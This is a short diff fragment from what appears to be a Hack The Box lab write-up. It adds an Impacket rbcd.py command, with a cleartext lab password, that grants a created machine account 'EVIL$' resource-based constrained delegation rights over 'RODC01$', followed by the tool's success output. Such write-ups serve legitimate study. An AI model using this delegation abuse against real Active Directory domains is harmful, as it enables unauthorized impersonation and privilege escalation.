@@ -337,4 +337,17 @@ ADD-COMP... 10.129.86.27    445    DC01             Successfully added the machi
 
 Then ill add a machine account
 
+```python
+❯❯❯ rbcd.py -delegate-from 'EVIL$' -delegate-to 'RODC01$' -action 'write' 'garfield.htb/l.wilson_adm:Password123!'
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
+[*] Delegation rights modified successfully!
+[*] EVIL$ can now impersonate users on RODC01$ via S4U2Proxy
+[*] Accounts allowed to act on behalf of other identity:
+[*]     EVIL$        (S-1-5-21-2502726253-3859040611-225969357-11601)
+```
+
+Then ill use the new machine account and setuip the delegation
+
 
